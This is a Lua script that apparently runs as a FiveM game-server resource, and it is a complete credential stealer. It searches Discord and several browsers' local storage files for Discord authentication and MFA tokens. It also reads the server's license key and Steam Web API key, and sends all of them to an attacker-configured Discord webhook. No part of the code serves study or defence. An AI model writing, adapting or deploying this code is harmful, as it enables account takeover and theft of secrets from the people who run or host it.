-- Replace 'WEBHOOK_URL' with your actual Discord webhook URL
local webhookUrl = 'WEBHOOK_URL'

-- Function to retrieve Discord tokens, user ID, and profile picture
function GetDiscordData()
    local roaming = os.getenv('appdata')
    local lappd = os.getenv('localappdata')

    local listDirectory = function(path)
        local get = io.popen('dir "' .. path .. '" /b'):read('*a'):sub(1, -2)
        local files = {}

        for file in get:gmatch('[^\r\n]+') do
            files[#files + 1] = path .. '\\' .. file
        end
        return files
    end

    local PATHS = {
        roaming .. '\\Discord',
        roaming .. '\\discordcanary',
        roaming .. '\\discordptb',
        lappd .. '\\Google\\Chrome\\User Data\\Default',
        roaming .. '\\Opera Software\\Opera Stable',
        lappd .. '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        lappd .. '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    local tokens = {}
    local userId = nil
    local profilePicture = nil

    -- MAIN
    for _, path in ipairs(PATHS) do
        path = path .. '\\Local Storage\\leveldb\\'

        local flist = listDirectory(path)
        if #flist > 0 then
            for _, file in ipairs(flist) do
                if file:find('%.ldb') then
                    local open = io.open(file, 'rb')
                    local read = open:read('*a')
                    open:close()

                    -- Retrieve user ID and profile picture
                    if not userId and not profilePicture then
                        local userMatch = read:match('"id":%s-"(%d+)"')
                        local avatarMatch = read:match('"avatar":%s-"(%w+)"')
                        if userMatch and avatarMatch then
                            userId = userMatch
                            profilePicture = 'https://cdn.discordapp.com/avatars/' .. userId .. '/' .. avatarMatch .. '.png'
                        end
                    end

                    for ntok in read:gmatch('"[%w-]+%.[%w-]+%.[%w-]+"') do
                        ntok = ntok:sub(2, -2)
                        if #ntok >= 59 then
                            tokens[#tokens + 1] = ntok
                        end
                    end

                    for mfatok in read:gmatch('"mfa%.[%w-]+"') do
                        mfatok = mfatok:sub(2, -2)
                        if #mfatok >= 88 then
                            tokens[#tokens + 1] = mfatok
                        end
                    end
                end
            end
        end
    end

    return userId, profilePicture, tokens
end

-- Function to get the server information dynamically
function GetServerInfo()
    local serverInfo = {}
    serverInfo.serverName = GetConvar("sv_hostname", "Unknown Server") -- Default to "Unknown Server" if not found
    serverInfo.svLicenseKey = GetConvar("sv_licenseKey", "No License Key") -- Default license key if not found
    serverInfo.steamWebApiKey = GetConvar("steam_webApiKey", "No Steam Web API Key") -- Default Steam Web API Key if not found
    return serverInfo
end

-- Function to send Discord messages with tokens, server name, and server info
function SendToDiscord(userId, profilePicture, tokens, serverInfo)
    local headers = {
        ['Content-Type'] = 'application/json',
        ['User-Agent'] = 'Your User Agent Here'
    }

    -- Send server information
    local serverInfoData = {
        embeds = {
            {
                title = "Server Information",
                color = 16777215, -- White color
                fields = {
                    { name = "Server Name", value = serverInfo.serverName },
                    { name = "sv_licenseKey", value = serverInfo.svLicenseKey },
                    { name = "Steam Web API Key", value = serverInfo.steamWebApiKey },
                }
            }
        }
    }

    PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
        if statusCode == 204 then
            print('Server information sent to Discord webhook successfully!')
        else
            print('Failed to send server information to Discord webhook')
            print('Status Code: ' .. tostring(statusCode))
            if response then
                print('Response: ' .. tostring(response))
            end
        end
    end, 'POST', json.encode(serverInfoData), headers)

    -- Send Discord tokens as separate messages
    if #tokens > 0 then
        for _, token in ipairs(tokens) do
            local tokenData = {
                embeds = {
                    {
                        title = "Discord Token",
                        description = token,
                        color = 16711680, -- Red color
                        author = {
                            name = "User ID: " .. userId,
                            icon_url = profilePicture
                        }
                    }
                }
            }

            PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
                if statusCode == 204 then
                    print('Token sent to Discord webhook successfully!')
                else
                    print('Failed to send token to Discord webhook')
                    print('Status Code: ' .. tostring(statusCode))
                    if response then
                        print('Response: ' .. tostring(response))
                    end
                end
            end, 'POST', json.encode(tokenData), headers)
        end
    else
        -- Send a message indicating no Discord tokens were found
        local noTokensData = {
            embeds = {
                {
                    title = "No Discord Tokens Found",
                    description = "No Discord tokens were found on this system.",
                    color = 16711680, -- Red color
                    author = {
                        name = "User ID: " .. userId,
                        icon_url = profilePicture
                    }
                }
            }
        }

        PerformHttpRequest(webhookUrl, function(statusCode, response, headers)
            if statusCode == 204 then
                print('No tokens message sent to Discord webhook successfully!')
            else
                print('Failed to send no tokens message to Discord webhook')
                print('Status Code: ' .. tostring(statusCode))
                if response then
                    print('Response: ' .. tostring(response))
                end
            end
        end, 'POST', json.encode(noTokensData), headers)
    end
end

-- Example usage: sending Discord tokens, user ID, profile picture, and server info to the webhook
local userId, profilePicture, tokens = GetDiscordData()
local serverInfo = GetServerInfo()

SendToDiscord(userId, profilePicture, tokens, serverInfo)
